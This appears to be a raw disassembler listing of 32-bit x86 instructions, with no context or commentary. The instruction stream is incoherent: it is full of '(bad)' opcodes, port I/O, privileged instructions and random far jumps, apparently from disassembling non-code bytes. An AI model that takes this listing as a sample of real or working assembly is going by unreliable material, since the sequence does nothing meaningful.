  4037e5:	mov    cl,0x3e
  4037e7:	outs   dx,BYTE PTR ds:[esi]
  4037e8:	jp     0x403826
  4037ea:	out    0x5b,al
  4037ec:	dec    ebp
  4037ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ee:	lea    edi,[esi]
  4037f0:	cmp    al,0x32
  4037f2:	push   eax
  4037f3:	adc    eax,0x3a6907ba
  4037f8:	cwde   
  4037f9:	sub    BYTE PTR [ebp-0x3c59c91],0xd2
  403800:	pop    esp
  403801:	(bad)  
  403802:	inc    BYTE PTR [ebp+0x661a1fe2]
  403808:	mov    ch,BYTE PTR [ecx]
  40380a:	pop    esi
  40380b:	inc    edi
  40380c:	ja     0x4037ab
  40380e:	dec    esp
  40380f:	mov    DWORD PTR ds:0x37cdbd66,edx
  403815:	jmp    FWORD PTR [edx-0x65a99cfc]
  40381b:	loop   0x403881
  40381d:	out    dx,eax
  40381e:	in     al,dx
  40381f:	mov    ebp,0x78120329
  403824:	out    0x31,eax
  403826:	std    
  403827:	add    al,0xb2
  403829:	(bad)  
  40382a:	xchg   esp,eax
  40382b:	jp     0x4037ad
  40382d:	fldenv [esi-0x56]
  403830:	fcmovne st,st(6)
  403832:	test   eax,0x4f15a49d
  403837:	lods   eax,DWORD PTR ds:[esi]
  403838:	pop    eax
  403839:	mul    BYTE PTR [edx+0x10c7975e]
  40383f:	xor    edi,edi
  403841:	pop    ecx
  403842:	std    
  403843:	inc    ebx
  403844:	icebp  
  403845:	sbb    BYTE PTR [esi+ebp*8-0x60],dh
  403849:	clc    
  40384a:	mov    ah,0x2a
  40384c:	(bad)
  40384f:	in     eax,dx
  403850:	jmp    0x9442:0x5b86632a
  403857:	call   0x37e5:0xa9385536
  40385e:	div    DWORD PTR [ebx-0x2269af45]
  403864:	iret   
  403865:	mov    ds:0x9fcaa90d,al
  40386a:	jge    0x40387f
  40386c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40386d:	fnstenv [ebp-0x23a886af]
  403873:	shl    ch,0xe6
  403876:	out    0x7d,eax
  403878:	out    dx,eax
  403879:	xor    bl,BYTE PTR [esi-0x7c75b42d]
  40387f:	push   ss
  403880:	push   ebp
  403881:	mov    eax,0x8784bb7f
  403886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403888:	pop    ecx
  403889:	(bad)  
  40388a:	jg     0x40382a
  40388c:	outs   dx,DWORD PTR ds:[esi]
  40388d:	xor    ebp,esp
  40388f:	cmp    ebp,esp
  403891:	call   DWORD PTR [eax+eax*2]
  403894:	dec    eax
  403895:	and    al,BYTE PTR ds:0x40a7
  40389a:	xchg   edi,eax
  40389b:	mov    edi,ebx
  40389d:	and    DWORD PTR [esi+0x34],esp
  4038a0:	xor    bh,bh
  4038a2:	xchg   esp,eax
  4038a3:	add    BYTE PTR [edx+0x5c8d48b5],bl
  4038a9:	clc    
  4038aa:	retf   
  4038ab:	mov    ebx,es
  4038ad:	test   eax,0xdb5b4012
  4038b2:	inc    ebx
  4038b3:	inc    eax
  4038b4:	adc    BYTE PTR [ebx+0x5d],bh
  4038b7:	mov    ds:0xc1e3aad1,eax
  4038bc:	(bad)  
  4038be:	out    dx,al
  4038bf:	retf   0x4dac
  4038c2:	repnz add eax,0x84d5ded
  4038c8:	and    ah,bl
  4038ca:	je     0x403853
  4038cc:	and    DWORD PTR [eax+0x74059802],ebp
  4038d2:	and    bl,bh
  4038d4:	outs   dx,BYTE PTR ds:[esi]
  4038d5:	out    0x89,al
  4038d7:	shl    BYTE PTR [esi-0x2f],cl
  4038da:	jb     0x403902
  4038dc:	out    dx,eax
  4038dd:	jnp    0x40395d
  4038df:	ret    0x8f5a
  4038e2:	(bad)  
  4038e3:	sub    BYTE PTR [ecx-0x479a04b3],bh
  4038e9:	(bad)  
  4038ea:	std    
  4038eb:	sub    ecx,eax
  4038ed:	test   DWORD PTR [ecx+0x1fe6b535],esp
  4038f3:	inc    ebp
  4038f4:	and    al,0xa5
  4038f6:	rcr    DWORD PTR [ecx-0x1c],1
  4038f9:	(bad)  
  4038fa:	xlat   BYTE PTR ds:[ebx]
  4038fb:	push   ebx
  4038fc:	mov    eax,ds:0xa24294fb
  403901:	dec    ebp
  403902:	retf   0xb9e6
  403905:	inc    esi
  403906:	xchg   ebx,eax
  403907:	ret    
  403908:	in     al,0xd6
  40390a:	std    
  40390b:	pushf  
  40390c:	ss (bad) 
  40390e:	les    ecx,FWORD PTR [eax]
  403910:	popa   
  403911:	hlt    
  403912:	xchg   ecx,eax
  403913:	push   ebx
  403914:	sub    edx,DWORD PTR [ebx+0x49]
  403917:	xchg   ebx,eax
  403918:	stc    
  403919:	pop    esp
  40391a:	mov    ch,0xd4
  40391c:	cmp    eax,DWORD PTR [ebp+0x1a]
  40391f:	jae    0x40398a
  403921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403922:	sar    BYTE PTR [ebp+0x60],cl
  403925:	into   
  403926:	sahf   
  403927:	adc    DWORD PTR [esi],edx
  403929:	aaa    
  40392a:	fwait
  40392b:	test   DWORD PTR [esi-0x5cfc6e88],edx
  403931:	push   esi
  403932:	push   es
  403933:	pop    es
  403934:	pop    eax
  403935:	jbe    0x4038e6
  403937:	dec    edx
  403938:	nop
  403939:	pushf  
  40393a:	push   ecx
  40393b:	cmp    DWORD PTR [esi+0x3d],0xfffffffe
  40393f:	es rol ch,cl
  403942:	into   
  403943:	ror    dh,1
  403945:	xchg   ecx,eax
  403946:	lods   eax,DWORD PTR ds:[esi]
  403947:	and    BYTE PTR [ebx],ch
  403949:	jl     0x403943
  40394b:	or     DWORD PTR [eax+ecx*4],eax
  40394e:	(bad)  
  40394f:	jne    0x403960
  403951:	mov    dh,0x39
  403953:	xor    DWORD PTR [ebx+edi*4-0x32],ebp
  403957:	mov    WORD PTR [esi+ebp*1+0xb331a15],gs
  40395e:	lds    esi,FWORD PTR [ebx-0x1f4040aa]
  403964:	(bad)  
  403966:	pop    ebx
  403967:	xchg   ecx,eax
  403968:	or     eax,0x4deec6e8
  40396d:	adc    cl,bh
  40396f:	cdq    
  403970:	std    
  403971:	test   DWORD PTR [edi+0x3c0524e6],ebp
  403977:	pop    ds
  403978:	push   edi
  403979:	mov    WORD PTR [edi-0x3a999df4],?
  40397f:	fbstp  TBYTE PTR [eax+0x3470cc9a]
  403985:	outs   dx,DWORD PTR ds:[esi]
  403986:	dec    ebp
  403987:	or     al,0x2c
  403989:	or     ebx,edx
  40398b:	(bad)  
  40398d:	push   eax
  40398e:	mov    al,0x4a
  403990:	lods   al,BYTE PTR ds:[esi]
  403991:	sub    DWORD PTR [esi-0x74],edi
  403994:	popf   
  403995:	mov    bl,0xf0
  403997:	retf   
  403998:	pop    ebx
  403999:	add    al,0x7a
  40399c:	mov    eax,0xc43afacb
  4039a1:	and    ah,BYTE PTR [esi+0x6a]
  4039a4:	sbb    DWORD PTR [edx-0x539febd],eax
  4039aa:	(bad)  
  4039ab:	push   ss
  4039ac:	mov    dh,0x1f
  4039ae:	fld    TBYTE PTR [edx-0x6d]
  4039b1:	popa   
  4039b2:	xor    edx,DWORD PTR [esi-0x47]
  4039b5:	icebp  
  4039b6:	in     al,0x1f
  4039b8:	outs   dx,DWORD PTR ds:[esi]
  4039b9:	mov    ecx,DWORD PTR [edx+0x2]
  4039bc:	cdq    
  4039bd:	out    dx,al
  4039be:	jp     0x4039cd
  4039c0:	mov    cl,0x74
  4039c2:	std    
  4039c3:	inc    edx
  4039c4:	xchg   edi,esp
  4039c6:	sbb    DWORD PTR [edx+0x3ff7b179],edx
  4039cc:	dec    ebx
  4039cd:	pop    esi
  4039ce:	pop    ebp
  4039cf:	outs   dx,DWORD PTR ds:[esi]
  4039d0:	adc    eax,0x2bce94d2
  4039d5:	data16 arpl WORD PTR [ecx-0x59],di
  4039d9:	inc    ecx
  4039da:	scas   eax,DWORD PTR es:[edi]
  4039db:	(bad)  
  4039dc:	aad    0x1c
  4039de:	int    0xd7
  4039e0:	mov    ds:0xdcd3bf4d,eax
  4039e5:	test   eax,0x65b8ca85
  4039ea:	pop    ecx
  4039eb:	jle    0x403992
  4039ed:	or     ebx,DWORD PTR [edx]
  4039ef:	jecxz  0x403a6b
  4039f1:	rcl    DWORD PTR [edi-0x7b55e6c1],1
  4039f7:	xchg   ecx,ebp
  4039f9:	(bad)  
  4039fb:	(bad)  
  4039fc:	mov    edx,0x781bc09f
  403a01:	mov    dh,BYTE PTR [eax+0x100e1a71]
  403a07:	mov    cl,0x3d
  403a09:	xchg   esp,eax
  403a0a:	mov    cl,0xa6
  403a0c:	ins    DWORD PTR es:[edi],dx
  403a0d:	int3   
  403a0e:	les    esp,FWORD PTR [eax-0x3eafad2c]
  403a14:	sbb    BYTE PTR ds:0x81a6bcda,bh
  403a1a:	ins    BYTE PTR es:[edi],dx
  403a1b:	(bad)  
  403a1c:	cli    
  403a1d:	cli    
  403a1e:	fidiv  WORD PTR [ecx]
  403a20:	ror    bh,cl
  403a22:	sub    DWORD PTR ds:0x1209da4c,eax
  403a28:	push   ebx
  403a29:	push   edi
  403a2a:	lods   al,BYTE PTR ds:[esi]
  403a2b:	stos   DWORD PTR es:[edi],eax
  403a2c:	add    ah,dh
  403a2e:	pusha  
  403a2f:	or     DWORD PTR [ebp+0x16501117],ecx
  403a35:	(bad)  
  403a37:	cwde   
  403a38:	data16 mov ah,0x4
  403a3b:	jmp    0xdd837bf0
  403a40:	inc    edi
  403a41:	jno    0x403a11
  403a43:	addr16 cld 
  403a45:	or     BYTE PTR [ebp+0x21],bl
  403a48:	dec    ecx
  403a4a:	push   ss
  403a4b:	pop    ebx
  403a4c:	mov    ds:0x977a7129,al
  403a51:	lahf   
  403a52:	shl    dl,1
  403a54:	les    edx,FWORD PTR [edx+ebx*8-0x14]
  403a58:	out    0xa8,al
  403a5a:	out    dx,eax
  403a5b:	cwde   
  403a5c:	jns    0x403abc
  403a5e:	js     0x4039f4
  403a60:	das    
  403a61:	jge    0x403a1e
  403a63:	shl    BYTE PTR [ebx-0x74],cl
  403a66:	aaa    
  403a67:	sbb    al,0x48
  403a69:	js     0x403a6f
  403a6b:	iret   
  403a6c:	jno    0x403a2e
  403a6e:	out    0xdd,eax
  403a70:	cmp    al,0x17
  403a72:	push   ds
  403a73:	cld    
  403a74:	daa    
  403a75:	outs   dx,DWORD PTR ds:[esi]
  403a76:	jp     0x403a13
  403a78:	jmp    0xd45f:0x57e8d3b8
  403a7f:	jb     0x403a60
  403a81:	sar    DWORD PTR [edx+ebx*2+0x3be36742],cl
  403a88:	jecxz  0x403ab0
  403a8a:	mov    ebx,0xdda80429
  403a8f:	sbb    BYTE PTR [eax-0x6a],cl
  403a92:	not    BYTE PTR [ebx]
  403a94:	mov    bl,0x42
  403a96:	add    ch,bl
  403a98:	test   DWORD PTR [ecx+0x5d],esi
  403a9b:	pusha  
  403a9c:	jle    0x403a66
  403a9e:	out    0x48,eax
  403aa0:	and    eax,0x10ef55f8
  403aa5:	cwde   
  403aa6:	scas   al,BYTE PTR es:[edi]
  403aa7:	jp     0x403a83
  403aa9:	lds    ecx,FWORD PTR [ebp+0x22204286]
  403aaf:	dec    eax
  403ab0:	out    0x5a,eax
  403ab2:	ds pop ecx
  403ab4:	jae    0x403a3c
  403ab6:	out    0x88,al
  403ab8:	and    al,0x2a
  403aba:	test   BYTE PTR [eax],ah
  403abc:	push   ecx
  403abd:	pop    esp
  403abe:	inc    edi
  403abf:	(bad)  
  403ac0:	dec    ebx
  403ac2:	sub    BYTE PTR [ecx-0x7f],bl
  403ac5:	ins    BYTE PTR es:[edi],dx
  403ac6:	xchg   edi,eax
  403ac7:	cdq    
  403ac8:	aaa    
  403ac9:	pop    edx
  403aca:	pop    esp
  403acb:	stos   DWORD PTR es:[edi],eax
  403acc:	push   ebx
  403acd:	int3   
  403ace:	shl    BYTE PTR [esi+0x1e2df98a],1
  403ad4:	xchg   edx,eax
  403ad5:	mov    cl,0x3e
  403ad7:	mov    WORD PTR [edx],fs
  403ad9:	mov    esp,0x15966c20
  403ade:	stos   BYTE PTR es:[edi],al
  403adf:	adc    al,0xf7
  403ae1:	out    dx,eax
  403ae2:	in     al,0x28
  403ae4:	ja     0x403b03
  403ae6:	pushf  
  403ae7:	jns    0x403b28
  403ae9:	dec    esp
  403aea:	sbb    DWORD PTR [ecx],edi
  403aec:	mov    ds:0xd767e55f,eax
  403af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af2:	xor    esi,eax
  403af4:	mov    ebx,0x25caef9f
  403af9:	mov    esi,0xdb659c63
  403afe:	jbe    0x403b4d
  403b00:	xor    eax,esp
  403b02:	mov    dl,0xa0
  403b04:	enter  0xc133,0xfb
  403b08:	and    BYTE PTR [ecx],0x3b
  403b0b:	push   cs
  403b0c:	xor    ah,bh
  403b0e:	mov    eax,ds:0x48cb174
  403b13:	test   BYTE PTR [esi+0x264dbe51],al
  403b19:	test   esp,0x142608ae
  403b1f:	enter  0x6ef0,0xc9
  403b23:	repz hlt 
  403b25:	cmc    
  403b26:	xchg   edx,eax
  403b27:	dec    DWORD PTR [ecx+edi*8]
  403b2a:	mov    ch,0xc4
  403b2c:	fistp  DWORD PTR [ebx+0x6374eb9d]
  403b32:	sub    bh,ch
  403b34:	int    0x54
  403b36:	sub    al,0x4b
  403b38:	(bad)  
  403b39:	jmp    0x403b01
  403b3b:	fnstcw WORD PTR [eax]
  403b3d:	sbb    al,cl
  403b3f:	xchg   esp,eax
  403b40:	imul   ebp,DWORD PTR [ebx+ecx*8],0x30c9e3ab
  403b47:	test   DWORD PTR [edi-0x4d248094],edx
  403b4d:	shl    BYTE PTR ds:0x459df0d5,cl
  403b53:	(bad)  
  403b54:	or     ecx,DWORD PTR [eax+0x4fafb309]
  403b5a:	mov    ds:0x79e0421b,eax
  403b5f:	(bad)  
  403b60:	and    bh,BYTE PTR [ebx+esi*4-0x6c1cf851]
  403b67:	cwde   
  403b68:	repz addr16 xchg edx,eax
  403b6b:	push   es
  403b6c:	sbb    BYTE PTR [ecx],ah
  403b6e:	fstp   TBYTE PTR [ecx-0x5daa9c18]
  403b74:	xor    BYTE PTR [edi-0x70bd742d],ah
  403b7a:	sahf   
  403b7b:	dec    edx
  403b7c:	and    ebp,DWORD PTR [edx+0x187ffb32]
  403b82:	sahf   
  403b83:	xchg   edx,eax
  403b84:	jnp    0x403ba7
  403b86:	xchg   esp,eax
  403b87:	and    BYTE PTR [ebx-0x4872041c],0x4b
  403b8e:	iret   
  403b8f:	dec    esp
  403b90:	(bad)  
  403b91:	sub    eax,DWORD PTR ds:0x98eec2ed
  403b97:	dec    eax
  403b98:	jg     0x403b64
  403b9a:	sub    al,0x6b
  403b9c:	or     ah,BYTE PTR [esi+0x62dc9bab]
  403ba2:	inc    esp
  403ba3:	add    al,0xa0
  403ba5:	shl    BYTE PTR [eax],cl
  403ba7:	pop    esi
  403ba8:	inc    ecx
  403ba9:	inc    eax
  403baa:	(bad)  
  403bab:	xchg   ebx,eax
  403bac:	inc    esi
  403bae:	mov    edi,0x2b45c281
  403bb3:	dec    esp
  403bb4:	mov    ah,0x96
  403bb6:	outs   dx,DWORD PTR ds:[esi]
  403bb7:	stc    
  403bb8:	add    DWORD PTR [edi],ecx
  403bba:	mov    bl,BYTE PTR fs:[ebp-0x2e93f862]
  403bc1:	push   ecx
  403bc2:	push   0x564857d4
  403bc7:	push   0xffffff97
  403bc9:	push   edx
  403bca:	xchg   edx,eax
  403bcb:	mov    ebx,0x9f233bd0
  403bd0:	mov    ch,0xfa
  403bd2:	sbb    BYTE PTR [ebx-0x3bea08b5],bl
  403bd8:	or     esi,edx
  403bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bdb:	jmp    0x258a:0xefae4138
  403be2:	or     eax,edi
  403be4:	out    dx,al
  403be5:	fstp   TBYTE PTR [eax-0x65]
  403be8:	sub    DWORD PTR [ecx+0x19],esp
  403beb:	sub    cl,dl
  403bed:	sub    eax,edi
  403bef:	or     DWORD PTR [esp],esi
  403bf2:	aam    0x24
  403bf4:	stos   BYTE PTR es:[edi],al
  403bf5:	enter  0x7a24,0xa6
  403bf9:	leave  
  403bfa:	mov    ds:0x200f6e1c,al
  403bff:	rcr    dh,1
  403c01:	add    eax,0x7f2d558d
  403c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c07:	test   DWORD PTR [ebx],0xf7e0f1cc
  403c0d:	inc    ebx
  403c0e:	dec    esp
  403c0f:	out    0x4c,al
  403c11:	fistp  QWORD PTR [ecx]
  403c13:	call   0xbb81:0xc4e5fa5a
  403c1a:	je     0x403be8
  403c1c:	(bad)  
  403c1d:	rcl    al,0x38
  403c20:	and    ah,al
  403c22:	sbb    ecx,DWORD PTR [ecx+0x21f86b90]
  403c28:	data16 or dl,BYTE PTR [ecx+0x1e51990b]
  403c2f:	mov    dh,0x67
  403c31:	outs   dx,DWORD PTR ds:[esi]
  403c32:	gs and eax,0x54cd875b
  403c38:	mov    dh,0xf6
  403c3a:	xor    cl,0x99
  403c3d:	add    eax,DWORD PTR fs:[ebp+0x6e]
  403c41:	sub    bl,BYTE PTR [edi+ebp*4-0x38]
  403c45:	add    cl,ah
  403c47:	in     eax,0x85
  403c49:	in     eax,dx
  403c4a:	loop   0x403ca4
  403c4c:	mov    al,0x5f
  403c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c4f:	sbb    al,0x32
  403c51:	je     0x403cc6
  403c53:	add    eax,0x1228cfac
  403c58:	pop    ss
  403c59:	in     eax,0x7
  403c5b:	arpl   WORD PTR [ecx-0x787481ab],bx
  403c61:	or     esp,esp
  403c63:	cld    
  403c64:	push   eax
  403c65:	sahf   
  403c66:	cdq    
  403c67:	aas    
  403c68:	ficom  DWORD PTR [ecx]
  403c6a:	in     al,0x72
  403c6c:	call   DWORD PTR [esi+0x6712dbc]
  403c72:	shl    dl,0x37
  403c75:	push   cs
  403c76:	pop    es
  403c77:	lahf   
  403c78:	stos   BYTE PTR es:[edi],al
  403c79:	cmp    BYTE PTR [ecx+0xdae722f],bl
  403c7f:	mov    DWORD PTR [ecx+ebx*4-0x63],esp
  403c83:	(bad)  
  403c84:	mov    esp,0xe55b6d1c
  403c89:	adc    ecx,edx
  403c8b:	inc    eax
  403c8c:	aaa    
  403c8d:	jmp    0x8633:0x961dfac2
  403c94:	xchg   ecx,eax
  403c95:	sbb    ecx,DWORD PTR [ecx-0x20]
  403c98:	test   ecx,esi
  403c9a:	shr    BYTE PTR [esi-0x20f5b70],1
  403ca0:	add    edi,DWORD PTR [edx+eiz*1-0x4acd8f99]
  403ca7:	jmp    0x403d0f
  403ca9:	adc    al,0xc4
  403cab:	push   ss
  403cac:	xchg   ebp,eax
  403cad:	call   0xeae4:0x2f812f66
  403cb4:	in     al,0x5d
  403cb6:	xchg   DWORD PTR [edx-0x7],ebx
  403cb9:	lock fmul QWORD PTR cs:[ebx+0x385be3ae]
  403cc1:	or     al,BYTE PTR [ebx-0x20]
  403cc4:	pop    esp
  403cc5:	test   DWORD PTR [edx+0x27],ebx
  403cc8:	mov    al,ds:0xec166ac2
  403ccd:	bound  esi,QWORD PTR [edi-0x14]
  403cd0:	nop
  403cd1:	cli    
  403cd2:	arpl   ax,si
  403cd4:	sub    DWORD PTR [ecx],ebp
  403cd6:	div    DWORD PTR [edi]
  403cd8:	arpl   WORD PTR [ebp-0x8b41469],bp
  403cde:	jno    0x403c79
  403ce0:	gs mov al,0xa5
  403ce3:	out    dx,al
  403ce4:	push   edi
  403ce5:	test   al,0xd0
  403ce7:	fistp  DWORD PTR [esi+0x39325032]
  403ced:	jmp    0x403d40
  403cef:	sbb    BYTE PTR [eax+0x1845e300],bl
  403cf5:	jg     0x403cda
  403cf7:	sar    BYTE PTR [edx-0x4d23ba86],1
  403cfd:	mov    esi,0x15ffd48b
  403d02:	push   es
  403d03:	adc    DWORD PTR [esp+ebp*1],edx
  403d06:	jne    0x403d33
  403d08:	repnz push es
  403d0a:	popa   
  403d0b:	outs   dx,BYTE PTR gs:[esi]
  403d0d:	sbb    dh,bh
  403d0f:	cmp    BYTE PTR [ecx-0x470af31a],bl
  403d15:	data16 and al,0xac
  403d18:	ret    
  403d19:	fs jno 0x403ca2
  403d1c:	adc    DWORD PTR [esi],eax
  403d1e:	imul   edi,ecx,0xffffffb3
  403d21:	mov    db4,edi
  403d24:	xchg   edx,eax
  403d25:	pushf  
  403d26:	loop   0x403d5b
  403d28:	pop    esp
  403d29:	fsub   st,st(6)
  403d2b:	cli    
  403d2c:	xor    dl,bh
  403d2e:	xor    ebp,DWORD PTR [ebx]
  403d30:	outs   dx,DWORD PTR ds:[esi]
  403d31:	loop   0x403d35
  403d33:	enter  0x42c5,0xa4
  403d37:	dec    esp
  403d38:	repz cmp ch,BYTE PTR [esi+ebx*4-0x5f30a1da]
  403d40:	xor    eax,ebp
  403d42:	call   0x1fc2:0x3dd83853
  403d49:	add    al,0xd1
  403d4b:	push   DWORD PTR [eax]
  403d4d:	mov    edx,0xa56c0a66
  403d52:	jbe    0x403cf7
  403d54:	sti    
  403d55:	xchg   ebx,eax
  403d56:	pop    eax
  403d57:	mov    al,0x18
  403d59:	mov    eax,0x64a95b82
  403d5e:	cmp    ch,BYTE PTR [esi+0x45]
  403d61:	xor    edx,DWORD PTR [esi+0x38]
  403d64:	adc    ebx,eax
  403d66:	xchg   edi,eax
  403d67:	dec    ebp
  403d68:	into   
  403d69:	jp     0x403d16
  403d6b:	adc    bh,BYTE PTR [esi]
  403d6d:	pop    ss
  403d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d6f:	(bad)  
  403d70:	cmp    eax,0x64392bfe
  403d75:	cmp    edi,DWORD PTR [eax+0x9]
  403d78:	push   ebp
  403d79:	fwait
  403d7a:	ds dec esp
  403d7c:	(bad)  
  403d7d:	out    0x73,eax
  403d7f:	cld    
  403d80:	loopne 0x403df3
  403d82:	clc    
  403d83:	popf   
  403d84:	add    BYTE PTR [edi],0xcd
  403d87:	or     DWORD PTR [ebx],ebx
  403d89:	or     eax,0xa6832b4e
  403d8e:	cdq    
  403d8f:	cmp    bl,bl
  403d91:	push   es
  403d92:	arpl   WORD PTR [edx],sp
  403d94:	(bad)  
  403d95:	and    al,0x2a
  403d97:	ja     0x403d59
  403d99:	push   ebp
  403d9a:	pop    edx
  403d9b:	shl    dh,0xaf
  403d9e:	fild   QWORD PTR [edx-0x49]
  403da1:	jb     0x403e14
  403da3:	xchg   edi,eax
  403da4:	dec    ecx
  403da5:	inc    ebx
  403da6:	inc    eax
  403da7:	outs   dx,BYTE PTR ds:[esi]
  403da8:	dec    edx
  403da9:	loop   0x403d5b
  403dab:	cs mov ah,0xbb
  403dae:	dec    eax
  403daf:	mov    cl,0x79
  403db1:	and    eax,0x840b843a
  403db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403db7:	push   ebx
  403db8:	lahf   
  403db9:	shr    DWORD PTR ds:0x285b9525,1
  403dbf:	xor    eax,0xd2266074
  403dc4:	push   0xffffffe2
  403dc6:	mov    esi,0x934cd92e
  403dcb:	xchg   esi,eax
  403dcc:	aam    0xca
  403dce:	int3   
  403dcf:	xchg   esp,eax
  403dd0:	stos   DWORD PTR es:[edi],eax
  403dd1:	cli    
  403dd2:	loope  0x403da3
  403dd4:	push   ecx
  403dd5:	nop
  403dd6:	lahf   
  403dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dd8:	xor    ebx,ecx
  403dda:	data16 sub ch,BYTE PTR cs:[edx]
  403dde:	push   ecx
  403ddf:	(bad)  
  403de1:	scas   al,BYTE PTR es:[edi]
  403de2:	sub    BYTE PTR ds:0x72336157,cl
  403de8:	(bad)  
  403de9:	mov    dl,0x78
  403deb:	ficomp DWORD PTR [esi]
  403ded:	push   esp
  403dee:	in     al,0xa2
  403df0:	retf   
  403df1:	ins    DWORD PTR es:[edi],dx
  403df2:	sahf   
  403df3:	cld    
  403df4:	shl    DWORD PTR [ecx+0x5a5f959b],0xb5
  403dfb:	mov    gs,WORD PTR ds:0xe4fff3ae
  403e01:	push   esp
  403e02:	jae    0x403d9e
  403e04:	jo     0x403da3
  403e06:	mov    ds:0xf27402ff,al
  403e0b:	push   es
  403e0c:	xor    eax,0x6894b80f
  403e11:	mov    dl,0x14
  403e13:	out    dx,al
  403e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e15:	(bad)  
  403e16:	popa   
  403e17:	xor    ah,BYTE PTR [eax-0x48ae07a7]
  403e1d:	(bad)  
  403e1e:	xor    dl,BYTE PTR [ecx-0x3b20054e]
  403e24:	sbb    DWORD PTR [edi],edi
  403e26:	mov    esp,0x3571c821
  403e2b:	xchg   BYTE PTR [eax],bh
  403e2d:	icebp  
  403e2e:	jmp    0x60c:0x8e45a64a
  403e35:	int3   
  403e36:	inc    edi
  403e37:	cmp    esi,DWORD PTR [ebx+0x4299b864]
  403e3d:	mov    dl,cl
  403e3f:	mov    eax,ds:0x60f5cdab
  403e44:	(bad)  
  403e45:	sbb    BYTE PTR ds:0x87e7aa1b,bh
  403e4b:	fnsave [eax+0x77e5775]
  403e51:	ret    0x72b6
  403e54:	mov    cl,0x52
  403e56:	rol    dl,0x35
  403e59:	sbb    eax,0xe3b09559
  403e5e:	mov    ebx,0x104736fc
  403e63:	lods   eax,DWORD PTR ds:[esi]
  403e64:	(bad)
  403e67:	add    DWORD PTR [edx+0x27],ebp
  403e6a:	shl    BYTE PTR [edx-0x19e7799d],cl
  403e70:	ret    
  403e71:	mov    edx,0xe1838990
  403e76:	and    BYTE PTR [edi-0x194806cf],ch
  403e7c:	stc    
  403e7d:	loope  0x403e6c
  403e7f:	fcmovnb st,st(1)
  403e81:	ja     0x403e23
  403e83:	xchg   ch,ah
  403e85:	mov    bl,0x3
  403e87:	push   cs
  403e88:	or     BYTE PTR [edx],dh
  403e8a:	jle    0x403e0c
  403e8c:	push   edi
  403e8d:	mov    al,0x0
  403e8f:	cmp    ebx,edi
  403e91:	rcr    BYTE PTR [esi-0x7c],cl
  403e94:	test   al,0xce
  403e96:	mov    ebp,0xb55d61a1
  403e9b:	adc    eax,0xa4203576
  403ea0:	in     eax,dx
  403ea1:	popf   
  403ea2:	jnp    0x403ee3
  403ea4:	lahf   
  403ea5:	not    esi
  403ea7:	inc    ebx
  403ea8:	test   DWORD PTR [eax+0x30c38e2f],ebx
  403eae:	(bad)  
  403eb0:	aas    
  403eb1:	xlat   BYTE PTR ds:[ebx]
  403eb2:	ret    
  403eb3:	adc    cl,BYTE PTR [ebx]
  403eb5:	push   0x70
  403eb7:	xor    BYTE PTR [eax-0x20],0x5c
  403ebb:	mov    ebp,0x594182ad
  403ec0:	stc    
  403ec1:	cmp    bl,cl
  403ec3:	add    esp,DWORD PTR [ecx-0x26238ea8]
  403ec9:	jno    0x403efe
  403ecb:	inc    ecx
  403ecc:	or     ah,BYTE PTR [edi+ecx*4+0x29]
  403ed0:	pop    es
  403ed1:	jg     0x403f04
  403ed3:	jle    0x403e73
  403ed5:	mov    bl,0x7a
  403ed7:	retf   
  403ed8:	adc    eax,eax
  403eda:	and    BYTE PTR [edx],0x98
  403edd:	mov    eax,ds:0x483a8908
  403ee2:	in     al,dx
  403ee3:	shl    al,cl
  403ee5:	jno    0xc61cce1e
  403eeb:	test   BYTE PTR [edx+0x7a],dl
  403eee:	(bad)  
  403eef:	das    
  403ef0:	pop    ss
  403ef1:	jmp    0x403f19
  403ef3:	in     eax,0x3
  403ef5:	cli    
  403ef6:	(bad)  
  403ef7:	mov    dh,0xb1
  403ef9:	jno    0x403ed3
  403efb:	(bad)  
  403efc:	mov    DWORD PTR [ebx],0x45daa216
  403f02:	js     0x403ebf
  403f04:	pop    edx
  403f05:	scas   al,BYTE PTR es:[edi]
  403f06:	call   0xb131:0xd4fd88c1
  403f0d:	shr    DWORD PTR [ecx-0x40ee0c9b],0xb7
  403f14:	or     eax,DWORD PTR [ebx+0x48295b76]
  403f1a:	and    al,0xb0
  403f1c:	push   0xffffffeb
  403f1e:	test   DWORD PTR [ebp+0x24d4ebe3],0x335524f
  403f28:	nop
  403f29:	je     0x403f19
  403f2b:	and    al,0x56
  403f2d:	mov    dl,0x83
  403f2f:	test   DWORD PTR [ebp-0x2f],ebp
  403f32:	loopne 0x403f84
  403f34:	test   DWORD PTR [esi+eiz*4-0xe],esi
  403f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f39:	sub    esp,DWORD PTR [edi+0x48f95332]
  403f3f:	es loopne 0x403f86
  403f42:	sub    dh,BYTE PTR [eax]
  403f44:	clc    
  403f45:	push   ebx
  403f46:	ins    DWORD PTR es:[edi],dx
  403f47:	sub    DWORD PTR [ecx],ebx
  403f49:	test   BYTE PTR [eax],ch
  403f4b:	js     0x403f7d
  403f4d:	leave  
  403f4e:	shr    BYTE PTR [ebp+0x7e4d364e],0xab
  403f55:	out    dx,eax
  403f56:	lds    eax,FWORD PTR [esi+0x3e]
  403f59:	inc    eax
  403f5a:	cwde   
  403f5b:	outs   dx,DWORD PTR ds:[esi]
  403f5c:	shr    BYTE PTR [edx],0x2c
  403f5f:	div    dh
  403f61:	sub    al,ah
  403f63:	stos   BYTE PTR es:[edi],al
  403f64:	fstp   QWORD PTR [edx+0x60de6037]
  403f6a:	aas    
  403f6b:	lock outs dx,DWORD PTR ds:[esi]
  403f6d:	fist   WORD PTR [edx+eiz*1]
  403f70:	ds loopne 0x403fc3
  403f73:	in     eax,dx
  403f74:	or     DWORD PTR [ebx+0x6186d69b],edx
